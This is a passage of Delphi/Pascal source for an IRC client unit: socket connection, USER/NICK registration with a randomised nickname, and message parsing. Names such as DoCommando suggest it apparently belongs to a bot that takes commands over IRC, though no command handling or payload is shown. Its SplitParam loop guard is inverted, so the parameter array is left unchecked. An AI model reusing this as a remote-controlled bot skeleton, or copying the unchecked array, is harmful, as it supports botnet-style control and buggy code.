  Data: String;
Begin
  Randomize;
  Data := 'USER '+Nick+' "'+Nick+IntToStr(Random(999))+'" "'+ServerN+'" :'+nick+#10;
  Send(Sock, Data[1], Length(Data), 0);
  Data := 'NICK '+Nick+#10;
  Send(Sock, Data[1], Length(Data), 0);
End;

Function  tSock.Connect;
Begin
  Result := False;
  Sock := Socket(AF_INET, SOCK_STREAM, 0);
  If (Sock = INVALID_SOCKET) Then Exit;

  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(Port);
  Addr.sin_addr.S_addr := inet_addr(pchar(server));

  If (Winsock.Connect(Sock, Addr, SizeOf(Addr)) = ERROR_SUCCESS) Then
  Begin
    Result := True;
    SendInfo;
    IRC.Sock := Sock;
    DoCommando;
  End;
  CloseSocket(Sock);
End;

Function  tSock.StartUp: Bool;
Begin
  Result := False;
  Servern := Server;
  Server := NameToIp(Server);
  WSAStartUp(MakeWord(2,1), WSA);
    IRC := tIRC.Create;
    IRC.LoggedIn := False;
    IRC.Silence := False;
    Result := Connect;
    IRC.Free;
  WSACleanUp;
End;

Function  tIRC.IsNumeric(Str : String): Bool;
Var
  I: Integer;
  N: String;
Begin
  Result := True;
  N := '0123456789';
  For I := 1 To Length(Str) Do
    If (Pos(Str[I], N) = 0) Then Result := False;
End;

Procedure tIRC.SplitParam(Data: String);
Var
  I     :Integer;
  Temp  :String;
Begin
  I     := 0;
  FillChar(Params, 9000, #0);
  While (Pos(' ', Data) > 0) or (i >= 9000) Do
  Begin
    Temp := Copy(Data, 1, Pos(' ', Data)-1);
    Data := Copy(Data, Pos(' ', Data)+1, Length(Data));
    If (Temp <> '') Then
    Begin
      Params[I] := Temp;
      Inc(I);
    End;
  End;
  If (Data <> '') Then
  Begin
    If (Pos(#10, Data) > 0) Then Delete(Data, Pos(#10, Data), 1);
    If (Pos(#13, Data) > 0) Then Delete(Data, Pos(#13, Data), 1);
    Params[I] := Data;
  End;
End;

Procedure tIRC.ParseInfo(Data: String);
Var
  Temp          :String;
Begin
  SplitParam(Data);
  IsCommand := False;

  // Nick, Host, Chan
  Temp := Params[0];
  If (Pos('@', Temp) > 0) Then
  Begin
    FromNick := Copy(Temp, 2, Pos('!', Temp)-2);
    FromHost := Copy(Temp, Pos('!', Temp)+1, Length(Temp));
  End;

  If (Params[2] <> '') Then
    If (Params[2][1] = '#') Then
      FromChan := Params[2];

  // Commands
  If (IsNumeric(Params[1])) Then
  Begin
    Commando := Params[1];
    IsCommand := True;
  End Else
    If (Params[1] = 'PRIVMSG') Then
    Begin
      RecvText := Copy(Data, Pos(Params[2], Data), Length(Data));
      RecvText := Copy(RecvText, Pos(':', RecvText)+1, Length(RecvText));
      If (Pos(#10, RecvText) > 0) Then Delete(RecvText, Pos(#10, RecvText), 1);
      If (Pos(#13, RecvText) > 0) Then Delete(RecvText, Pos(#13, RecvText), 1);
    End;
End;

Function tIRC.ReceiveData: Bool;
Var
  TimeOut       :TimeVal;
  FD_Struct     :TFDSet;
Begin
  TimeOut.tv_sec := 240;
  TimeOut.tv_usec := 0;

  FD_ZERO(FD_Struct);
  FD_SET (Sock, FD_Struct);

  If (Select(0, @FD_Struct, NIL, NIL, @TimeOut) <= 0) Then
  Begin
    CloseSocket(Sock);
    Result := False;
    Exit;
  End;
  Result := True;
End;



end.
